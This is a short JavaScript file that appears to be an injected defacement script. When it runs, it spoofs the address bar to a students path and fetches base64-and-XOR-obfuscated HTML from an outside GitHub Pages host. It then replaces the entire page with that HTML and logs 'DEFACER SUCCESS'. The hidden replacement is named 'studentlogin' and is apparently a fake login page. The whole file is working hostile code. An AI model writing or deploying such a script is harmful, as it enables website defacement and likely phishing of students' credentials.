function xorEncryptDecrypt(decodedhtml, key) {
    let result = '';
    for (let i = 0; i < decodedhtml.length; i++) {
        result += String.fromCharCode(decodedhtml.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function deface() {
    history.replaceState(null, null, 'ucc/students/');
    fetch('https://cybercutie0.github.io/-/studentlogin.txt')
        .then(response => response.text()) // Get the response as text (HTML content)
        .then(data => {
            let decodedhtml = atob(data);
            let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
            // Replace the entire HTML of the current document
            document.documentElement.innerHTML = decryptedHTML;
        })
        .catch(error => console.error('Error:', error));
}

console.log("DEFACER SUCCESS");
deface();
